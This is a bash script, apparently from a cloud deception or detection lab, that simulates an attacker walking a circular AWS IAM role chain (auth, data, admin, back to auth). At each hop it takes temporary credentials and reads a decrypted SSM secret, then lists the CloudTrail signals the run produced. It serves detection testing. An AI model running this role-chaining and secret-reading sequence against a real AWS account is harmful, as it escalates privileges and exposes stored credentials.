#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 8 (IAM Role Chain Loop Lure)
#
# Three roles in a circular assumption chain: auth -> data -> admin -> auth.
# Each hop reads a themed SSM parameter and then assumes the next role, so a
# single compromised credential can walk the entire loop.
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 8 — ABUSE CHAIN"
echo "  IAM Role Chain Loop Lure (auth → data → admin → auth)"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

ROLE_AUTH_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-auth-role"
ROLE_DATA_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-data-role"
ROLE_ADMIN_ARN="arn:aws:iam::${ACCOUNT_ID}:role/prod-microservice-admin-role"

# ---------------------------------------------------------------
step "2" "Hop 1 — Assuming the entry point: prod-microservice-auth-role"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_AUTH_ARN}"
AUTH_CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_AUTH_ARN}" \
  --role-session-name "recon-auth" \
  --query "Credentials" --output json)
export AWS_ACCESS_KEY_ID=$(echo "$AUTH_CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$AUTH_CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$AUTH_CREDS" | jq -r .SessionToken)
info "auth-role assumed"

attack "ssm:GetParameter → /prod/auth/oidc-config"
aws ssm get-parameter --name "/prod/auth/oidc-config" --with-decryption --output json \
  | jq '.Parameter | {Name, Value}'

# ---------------------------------------------------------------
step "3" "Hop 2 — Pivoting to prod-microservice-data-role (chained AssumeRole)"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_DATA_ARN} (using auth-role's own credentials)"
DATA_CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_DATA_ARN}" \
  --role-session-name "recon-data" \
  --query "Credentials" --output json)
export AWS_ACCESS_KEY_ID=$(echo "$DATA_CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$DATA_CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$DATA_CREDS" | jq -r .SessionToken)
info "data-role assumed — pivot successful, one hop deeper into the chain"

attack "ssm:GetParameter → /prod/data/lake-credentials"
aws ssm get-parameter --name "/prod/data/lake-credentials" --with-decryption --output json \
  | jq '.Parameter | {Name, Value}'

# ---------------------------------------------------------------
step "4" "Hop 3 — Pivoting to prod-microservice-admin-role (chained AssumeRole)"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_ADMIN_ARN} (using data-role's own credentials)"
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ADMIN_ARN}" \
  --role-session-name "recon-admin" \
  --query "Credentials" --output json)
export AWS_ACCESS_KEY_ID=$(echo "$ADMIN_CREDS" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "$ADMIN_CREDS" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "$ADMIN_CREDS" | jq -r .SessionToken)
info "admin-role assumed — this role's name alone should raise an eyebrow"

attack "ssm:GetParameter → /prod/admin/console-credentials"
aws ssm get-parameter --name "/prod/admin/console-credentials" --with-decryption --output json \
  | jq '.Parameter | {Name, Value}'

# ---------------------------------------------------------------
step "5" "Closing the loop — admin-role can assume auth-role again (chained AssumeRole)"
# ---------------------------------------------------------------
attack "sts:AssumeRole → ${ROLE_AUTH_ARN} (using admin-role's own credentials)"
LOOP_CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_AUTH_ARN}" \
  --role-session-name "recon-loop-closed" \
  --query "Credentials" --output json)
if [[ -n "$(echo "$LOOP_CREDS" | jq -r '.AccessKeyId // empty')" ]]; then
  info "Loop confirmed: admin → auth succeeded. A single initial foothold in any ONE of"
  info "these three roles gives standing access to all three, indefinitely, via re-chaining."
fi

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "6" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on prod-microservice-auth-role (x2 — entry and loop-close)"
echo "  • CloudTrail: AssumeRole on prod-microservice-data-role"
echo "  • CloudTrail: AssumeRole on prod-microservice-admin-role"
echo "  • CloudTrail: GetParameter on /prod/auth/oidc-config"
echo "  • CloudTrail: GetParameter on /prod/data/lake-credentials"
echo "  • CloudTrail: GetParameter on /prod/admin/console-credentials"
echo ""
